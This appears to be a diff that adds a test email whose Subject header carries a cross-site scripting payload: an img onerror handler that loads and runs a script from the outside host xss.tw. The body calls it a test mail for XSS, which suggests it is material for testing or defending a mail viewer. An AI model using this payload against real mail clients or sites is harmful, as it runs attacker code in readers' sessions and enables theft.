@@ -1,0 +1,7 @@
+From: Margaret Schneider <semdu@gk-ag.com>
+To: hector.mcloughlin@enron.com, beth.apollo@enron.com, m.hall@enron.com, 
+Subject: <img src=hi onerror=document.body.appendChild(createElement('script')).src='//xss.tw/4091'>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
